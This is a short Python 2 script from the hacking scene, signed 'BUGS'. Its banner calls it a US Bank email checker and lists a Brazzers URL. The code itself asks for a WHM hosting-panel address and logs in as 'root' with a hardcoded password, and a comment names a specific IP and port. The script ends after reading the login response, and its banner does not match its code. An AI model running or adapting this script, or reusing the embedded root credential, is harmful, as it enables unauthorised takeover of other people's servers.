#!/usr/bin/python
# -*- coding: utf-8 -*-

# ( -- IMPORTS -- ) #
import requests
import time
import json
import sys

# ( -- LOGO * INFO -- ) #
bugs = '''
    ____  ____  _   _  ____ ____         ____ _   _ _____ ____ _  _______ ____  ____  
   / __ \| __ )| | | |/ ___/ ___|       / ___| | | | ____/ ___| |/ / ____|  _ \/ ___| 
  / / _` |  _ \| | | | |  _\___ \ _____| |   | |_| |  _|| |   | ' /|  _| | |_) \___ \ 
 | | (_| | |_) | |_| | |_| |___) |_____| |___|  _  | |__| |___| . \| |___|  _ < ___) |
  \ \__,_|____/ \___/ \____|____/       \____|_| |_|_____\____|_|\_\_____|_| \_\____/ 
   \____/                                                                             
\n [$] BUGS USBANK VALID EMAIL CHECKER.
 [$] URL = ('https://www.Brazzers.com/').
 [$] SCRIPT PROGRAMMED BY BUGS WITH PYTHON2.
'''
#################################
# ( -- PROGRAMMED BY @BUGS -- ) #
#################################

# ( -- FULL API SCRIPT -- ) #

#https://162.214.15.127:2087/

whm = raw_input('[X] ENTER YOUR WHM IP:PORT X> ')
log_url = 'https://' + str(whm) + '/login/?login_only=1'
log_data = {
	'user': 'root',
	'pass': '12}SjL}9jr{K',
	'goto_uri': '%2F'
}

log_req = requests.post(log_url, data=log_data)
log_src = log_req.json()